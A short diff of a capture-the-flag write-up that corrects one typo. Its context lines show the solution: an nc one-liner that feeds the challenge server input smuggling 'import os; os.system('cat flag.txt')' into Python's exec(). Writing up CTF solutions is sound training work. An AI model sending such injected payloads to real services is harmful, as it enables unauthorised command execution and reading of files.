@@ -210,7 +210,7 @@ We managed to print the variable a (the 'abc'). It would be great if we could pu
 > exec(object[, globals[, locals]]) <br/>
 > This function supports dynamic execution of Python code. object must be either a string or a code object. If it is a string, the string is parsed as a suite of Python statements which is then executed (unless a syntax error occurs).
 
-Seems perfctly suitable. And yep, we can retrieve the flag with:
+Seems perfectly suitable. And yep, we can retrieve the flag with:
 ```shell
 python -c "print('1\na\nimport os; os.system(\'cat flag.txt\')\n1\n' + 'exec(a)\n' + '1\n3\n4\n6\n')" | nc config-creator.ctf.insecurity-insa.fr 10000
 ```
